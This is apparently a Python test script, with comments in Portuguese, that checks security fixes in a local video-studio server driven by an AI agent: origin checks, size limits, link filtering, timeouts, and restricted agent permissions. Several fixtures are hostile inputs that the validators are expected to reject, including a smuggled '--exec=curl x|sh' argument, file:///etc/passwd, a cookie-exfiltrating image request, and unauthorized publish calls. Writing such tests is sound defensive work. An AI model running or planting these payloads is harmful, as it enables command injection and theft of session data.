"""Tipo A (sem IA, sem rede, sem o servidor no ar): os consertos da revisão de 25/10/2026 (ele: "revise o código, vê se
tem como tornar o código mais seguro, sólido e confiável" e "pode fazer"). Usa uma pasta de vídeos temporária.

  .venv/bin/python testes/solidez.py
"""
import io, subprocess, sys, tempfile, time, types
from pathlib import Path

RAIZ = Path(sys.argv[0]).resolve().parent.parent
sys.path[:0] = [str(RAIZ), str(RAIZ / "ferramentas")]
import estudio as E
E.VIDEOS = Path(tempfile.mkdtemp()) / "videos"
E.LIXEIRA = E.VIDEOS / "_lixeira"
sys.argv = [sys.argv[0], "4493"]
import servidor as S
import baixar, saida_casa

falhas = []

# 1. o pedido que quebra o trabalhador: na 1ª falha tenta de novo; na 2ª responde no chat, volta à espera e não religa
num, _ = E.criar_item("igual", texto="teste")
E.mexe_ficha(num, etapa="Animação", passo="trabalhando no seu pedido", esperando="")
msg, _ = E.chat_add(num, "ele", "troca a cor do título")
def quebra(*a, **k):
    raise RuntimeError("capa-2.html sumiu")
S.maestro_atende = quebra
religou = []
S.garantir = lambda n: religou.append(n)
S.trabalhador(num)
if religou != [num] or not E.pendentes(num):
    falhas.append(f"1ª falha: devia tentar de novo (religou={religou})")
S.trabalhador(num)
resp = [m for m in E.chat(num) if m["quem"] == "agente" and m.get("responde") == msg["id"]]
f = E.ler_ficha(num)
if len(religou) != 1:
    falhas.append(f"2ª falha: religou de novo (laço pago): {religou}")
if not resp or "Não consegui fazer este pedido" not in resp[0]["texto"] or "capa-2.html sumiu" not in resp[0]["texto"]:
    falhas.append(f"2ª falha: o chat não recebeu o erro: {resp}")
if f["passo"] != "prévia pronta" or S.MAPA.confere(f["etapa"], f["passo"], f.get("esperando") or ""):
    falhas.append(f"2ª falha: o vídeo não voltou a um passo de espera do mapa: {f['etapa']} · {f['passo']} · {f.get('esperando')}")

# 2. uma linha cortada no chat.jsonl não derruba o vídeo
with open(E.pasta(num) / "chat.jsonl", "a") as h:
    h.write('{"id": "x", "quem": "ele", "texto": "pela met\n')
try:
    E.chat(num); E.pendentes(num)
except Exception as ex:
    falhas.append(f"linha cortada no chat derrubou a leitura: {ex}")

# 3. pedido de outro site e pedido grande demais
def pedido(command, **h):
    return types.SimpleNamespace(command=command, headers=h)
casos = [("POST", {"Host": "127.0.0.1:4400", "Origin": "https://site-qualquer.com"}, False),
         ("GET", {"Host": "atacante.com:4400"}, False),
         ("POST", {"Host": "127.0.0.1:4400", "Origin": "http://127.0.0.1:4400"}, True),
         ("POST", {"Host": "admin.newsbr360.com", "Origin": "https://admin.newsbr360.com"}, True),
         ("POST", {"Host": "127.0.0.1:4400"}, True),                     # as ferramentas do estúdio (sem Origin)
         ("GET", {"Host": "localhost:4400", "Origin": "https://site-qualquer.com"}, True)]
for cmd, h, espera in casos:
    if S.H._mesmo_site(pedido(cmd, **h)) != espera:
        falhas.append(f"{cmd} {h}: devia {'aceitar' if espera else 'recusar'}")
for n in ("999999999999", "-5", "abc"):
    p = types.SimpleNamespace(headers={"Content-Length": n}, rfile=io.BytesIO(b"x"))
    try:
        S.H._corpo(p)
        falhas.append(f"Content-Length {n} foi aceito")
    except ValueError:
        pass

# 4. o download: só link da internet; o link vai depois de "--" e sem configuração de fora
for l, espera in (("https://www.instagram.com/reel/X/", True), ("--exec=curl x|sh", False), ("http://127.0.0.1:4400/api/funil", False),
                  ("http://10.0.0.5/a", False), ("file:///etc/passwd", False)):
    if baixar.link_de_fora(l) != espera:
        falhas.append(f"link {l!r}: devia {'aceitar' if espera else 'recusar'}")
visto = []
saida_casa.subprocess = types.SimpleNamespace(run=lambda args, **k: (visto.append(args), types.SimpleNamespace(returncode=0, stderr="", stdout=""))[1],
                                              TimeoutExpired=subprocess.TimeoutExpired)
saida_casa.anotar = lambda *a, **k: None
saida_casa._tenta(["yt-dlp", "-q", "--print", "duration", "https://youtu.be/abc"], {}, "teste", "direto", None, Path(tempfile.mkdtemp()), [], 30, None)
a = visto[0] if visto else []
if "--ignore-config" not in a or a[-2:] != ["--", "https://youtu.be/abc"]:
    falhas.append(f"o yt-dlp não recebeu --ignore-config e o link depois de '--': {a}")

# 5. o prazo para o processo travado (antes, o claude -p preso prendia o vídeo para sempre)
p = subprocess.Popen(["sleep", "30"], start_new_session=True, stdout=subprocess.PIPE)
t0 = time.time(); prazo = E.prazo(p, 1)
p.stdout.read()                              # quem chamou fica preso lendo, como o trabalhar()
if time.time() - t0 > 10 or not prazo.estourou:
    falhas.append(f"o prazo não parou o processo ({time.time() - t0:.0f} s)")

# 6. o toque em Publicar enquanto o maestro decide (em Aguardando) não é desfeito
num, _ = E.criar_item("igual", texto="teste")
E.mexe_ficha(num, etapa="Aguardando", passo="vídeo final pronto", esperando="Publicar")
msg, _ = E.chat_add(num, "ele", "o que achou do vídeo?")
def decide_e_ele_toca(n, texto, msg_id=None):
    E.mexe_ficha(n, passo=S.PUBLICANDO, esperando="")          # ele tocou em Publicar no meio
    return {"intencao": "pergunta", "acoes": [{"ferramenta": "responder", "instrucao": ""}]}
S.maestro.decidir = decide_e_ele_toca
S.responder_sem_mexer = lambda n, m: E.chat_add(n, "agente", "ok", responde=m["id"])
S.aprovado_atende(num, msg)
if E.ler_ficha(num)["passo"] != S.PUBLICANDO:
    falhas.append(f"o toque em Publicar durante a conversa foi desfeito: {E.ler_ficha(num)['passo']}")

# 7. a animação interrompida pelo religar recomeça com o pedido que tinha
num, _ = E.criar_item("igual", texto="teste")
E.mexe_ficha(num, etapa="Animação", passo=S.ANIMANDO, animacao_pendente={"pedido": "Ajuste SÓ o bloco 3 à voz nova", "modo": None})
pedidos = []
S.animacao.animar = lambda n, pedido, modo=None: (pedidos.append(pedido), "Ajustei o bloco 3.")[1]
S.capa.opcoes = lambda n: [{"op": 1}]
S.legenda_post.ler = lambda n: {"texto": "x"}
S.esperando_animacao = lambda n: "Aprovar o vídeo"
S.olho_unico.na_previa = lambda n: None
S.animar(num)
if pedidos != ["Ajuste SÓ o bloco 3 à voz nova"]:
    falhas.append(f"a animação retomada não recebeu o pedido de antes: {pedidos}")
if not any("retomei" in m["texto"] for m in E.chat(num)):
    falhas.append("o chat não disse que a animação foi retomada")

# 8. o pedido guardado do Reabrir é atendido pelo trabalhador do vídeo, uma vez (antes, um thread solto)
num, _ = E.criar_item("igual", texto="teste")
E.mexe_ficha(num, etapa="Animação", passo="prévia pronta", pedido_guardado={"id": "g1", "texto": "troca a foto do bloco 2"})
atendidos = []
S.maestro_atende = lambda n, m: (atendidos.append(m["texto"]), True)[1]
S.trabalhador(num)
if atendidos != ["troca a foto do bloco 2"] or E.ler_ficha(num).get("pedido_guardado"):
    falhas.append(f"o pedido guardado não foi atendido uma vez pelo trabalhador: {atendidos}")

# 9. segurança: o agente só com permissões de arquivo com caminho; regras/ negada para escrita; cena perigosa bloqueada
import agente as AG, animacao as AN
perm = AG.com_caminho([AG.FERRAMENTAS, "Read,Write,Edit,Glob,Grep", "Bash(python3 x.py:*)"])
soltas = [p for p in perm if p in ("Read", "Edit", "Write", "Glob", "Grep")]
if soltas or not all(any(p.startswith(f + "(") for p in perm) for f in ("Read", "Edit", "Write", "Glob", "Grep")):
    falhas.append(f"permissão de arquivo sem caminho para o agente: {soltas or perm}")
if not any(p.startswith("Edit(") and p.endswith("/regras/**)") for p in AG.negadas()):
    falhas.append("regras/ não está negada para escrita")
for c, ruim in (('tl.to(".a", {opacity: 1}); el.style.top = "10px"', False), ('fetch("/api/item/3/publicar", {method: "POST"})', True),
                ('window.parent.document.querySelector("#publicar").click()', True), ('new Image().src = "//x.com/?" + document.cookie', True)):
    if bool(AN.codigo_perigoso(c)) != ruim:
        falhas.append(f"cena {c[:40]!r}: devia {'bloquear' if ruim else 'passar'}")
num, _ = E.criar_item("igual", texto="teste")
(E.pasta(num) / "animacao").mkdir(parents=True, exist_ok=True)
(E.pasta(num) / "animacao/cena.html").write_text('<script>function montar(T, tl){ fetch("/api/item/1/publicar", {method: "POST"}); }</script>')
AN.dados = lambda n: {"duracao": 10.0, "blocos": []}
AN.rostos_dos_takes = lambda *a, **k: {}
AN.rostos_todos = lambda n: {}
AN.tarjas_dos_videos = lambda *a, **k: {}
(E.pasta(num) / "narracao").mkdir(exist_ok=True); (E.pasta(num) / "narracao/completo.json").write_text("{}")
pagina = AN.pagina(num)
if "fetch(\"/api/item/1/publicar\"" in pagina or "cena bloqueada" not in pagina:
    falhas.append("a página da prévia rodaria a cena perigosa")
if S.H._mesmo_site(pedido("POST", Host="127.0.0.1:4400", Origin="null")):
    falhas.append("POST com Origin null foi aceito")

if falhas:
    print("FALHOU · " + "; ".join(falhas))
    sys.exit(1)
print("passou · pedido que quebra 2x responde e não entra em laço; linha cortada no chat; outro site e pedido grande "
      "recusados; só link da internet, depois de '--'; o prazo para o processo travado; toque durante a conversa vale; animação retomada com o pedido; pedido guardado atendido; agente sem acesso fora da pasta; cena perigosa bloqueada")
